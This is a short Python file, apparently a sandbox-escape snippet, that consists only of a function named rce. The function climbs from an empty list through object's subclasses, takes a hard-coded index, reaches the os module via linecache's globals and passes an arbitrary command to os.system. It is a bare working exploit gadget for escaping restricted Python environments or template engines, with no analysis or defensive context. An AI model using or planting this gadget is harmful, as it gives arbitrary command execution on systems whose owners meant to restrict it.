# -*- coding：utf-8 -*-
def rce(cmd):
    [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system(cmd)